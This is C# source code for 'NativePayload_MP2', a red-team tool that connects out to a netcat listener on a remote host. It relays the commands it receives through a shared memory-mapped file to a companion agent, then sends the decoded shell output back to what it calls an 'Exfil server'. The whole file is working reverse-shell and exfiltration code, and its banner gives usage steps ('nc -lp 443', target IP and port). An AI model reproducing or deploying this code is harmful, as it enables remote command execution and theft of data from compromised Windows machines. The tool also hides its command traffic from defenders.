using System;
using System.Collections.Generic;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NativePayload_MP2
{
    class Program
    {
        public static string lastcmd = "";
       
        public static string _CMDshell(string _Command)
        {
            string final = "";
            string xtemp = "";
           
            Console.ForegroundColor = ConsoleColor.Gray;
            try
            {
                string yourcmd = "";
                bool getcmdagain = false;
                string oldcmd = "";
                string s = "";
                bool show = false;
            ops:
                Console.ForegroundColor = ConsoleColor.Gray;
                show = false;
                using (MemoryMappedFile mmf2 = MemoryMappedFile.OpenExisting("ClientMapper"))
                {
                    show = false;

                    Mutex mutex = Mutex.OpenExisting("_ClientMapper");
                    using (MemoryMappedViewStream stream = mmf2.CreateViewStream())
                    {
                        Console.ForegroundColor = ConsoleColor.DarkYellow;

                        Console.WriteLine(DateTime.Now.ToString() + " [!] Searching in-Memory... Dumping in-Memory from [NativePayload_MPAgent]");
                        Console.ForegroundColor = ConsoleColor.Green;

                        BinaryReader reader = new BinaryReader(stream);

                        s = reader.ReadString();

                        Console.WriteLine(DateTime.Now.ToString() + " " + s);
                        Console.ForegroundColor = ConsoleColor.Gray;
                        show = true;
                    }


                    if (s.Contains("@getcmd=") || getcmdagain && lastcmd != _Command)
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGray;
                        Console.WriteLine("[>] Set Command and press enter");
                        Console.ForegroundColor = ConsoleColor.Blue;
                        yourcmd = _Command;
                        lastcmd = yourcmd;
                        show = false;
                        Console.ForegroundColor = ConsoleColor.DarkGray;
                        Console.WriteLine("[>] Sending Command to Memory");
                        using (MemoryMappedViewStream streamw = mmf2.CreateViewStream())
                        {
                            Console.ForegroundColor = ConsoleColor.DarkYellow;
                            BinaryWriter writer = new BinaryWriter(streamw);
                            writer.Write("[!] " + DateTime.Now.ToString() + " NativePayload_MP.CS.cmd =>" + yourcmd);
                        }
                        getcmdagain = false;
                        oldcmd = yourcmd;
                    }
                    else if (s.Contains("cmd output => ") || getcmdagain == false && oldcmd != yourcmd && show)
                    {   /// bug fixed, i think ;)
                        if (show && s.Split('>')[1] != string.Empty)
                        {
                            Console.ForegroundColor = ConsoleColor.White;
                            Console.WriteLine("[>] {0} Command Output Downloaded from Memory", DateTime.Now.ToString());
                            Console.WriteLine("========================================");
                            Console.ForegroundColor = ConsoleColor.Green;
                            //strOutput = Convert.ToBase64String(UnicodeEncoding.UTF8.GetBytes(outputs.StandardOutput.ReadToEnd()));
                            string temp = s.Split('>')[1];
                            final = UTF8Encoding.UTF8.GetString(Convert.FromBase64String(temp));

                            Console.WriteLine(final);
                            Console.ForegroundColor = ConsoleColor.White;
                            Console.WriteLine("========================================");
                        }
                        getcmdagain = true;
                        Console.ForegroundColor = ConsoleColor.Gray;
                        show = false;
                      
                        xtemp = final;
                        return xtemp;

                    }
                    Console.ForegroundColor = ConsoleColor.Gray;

                    Thread.Sleep(5000);
                    show = false;

                    goto ops;

                }
            }
            catch (Exception)
            {


            }
            /// these lines does not matter ;)
            //  xtemp = "[" + _AllIPs + "] => " + final;
            xtemp = final;
            return xtemp;
        }
        public static StringBuilder _6 = new StringBuilder();
        public static StreamWriter two;
        public static StreamReader _3;
        public static Stream four;
        public static TcpClient five;
        public static StringBuilder _1_2_points = new StringBuilder();
        public static string Ivean_Polkka = "2";
        public static string oldcmd = "0";

        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_MP2 Tool , Published by Damon Mohammadbagher , Mar 2021");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_MP2 , Mapper/Proxy tool (Dumping/Sending Shell outputs from Memory to Exfil server via TCP/netcat) ");
            Console.WriteLine();
            Console.WriteLine("syntax: NativePayload_MP2.exe [targetip] [port]");
            Console.WriteLine("example  step0    (win): NativePayload_MPAgent.exe");
            Console.WriteLine("example  step1  (linux): nc -lp 443");
            Console.WriteLine("example  step2    (win): NativePayload_MP2.exe 192.168.56.1 443");
            Console.WriteLine();
            Console.WriteLine("[!] Waiting for Commands from \"nc\"....");
            Console.WriteLine();
            try
            {
                /// this code is test version & some bugs are here ;)
                five = new TcpClient(args[0].ToString(), Convert.ToInt32(args[1]));
            Ops:
                /// this is FREE STYLE code ¯\_(ツ)_/¯ 
                five.ReceiveTimeout = 0;
                four = five.GetStream();
                Thread.Sleep(3000);
                while ((_3 = new StreamReader(four)) != null)
                {
                    two = new StreamWriter(four);
                    Thread.Sleep(1000);
                   
                    while (true)
                    {
                       
                        _6.Append(_3.ReadLine());

                        Ivean_Polkka = _CMDshell(_6.ToString());

                        if (String.IsNullOrEmpty(Ivean_Polkka))
                        {
                            _6.Remove(0, _6.Length);
                            oldcmd = "0";
                            Thread.Sleep(1000);
                            lastcmd = "ops2";
                            goto Ops;
                        }
                        _6.Remove(0, _6.Length);
                        Thread.Sleep(2000);
                        if (!String.IsNullOrEmpty(Ivean_Polkka))
                        {
                            _1_2_points.Append(Ivean_Polkka + "===================\n");
                            two.WriteLine(_1_2_points);
                            two.Flush();
                            _1_2_points.Remove(0, Ivean_Polkka.Length + 20);
                            oldcmd = Ivean_Polkka;
                            Ivean_Polkka = string.Empty;
                            _6.Remove(0, _6.Length);
                            lastcmd = "ops";
                        }

                    }

                }
                goto Ops;
            }
            catch (Exception err) { Console.WriteLine(err.Message); }
        }
    }
}
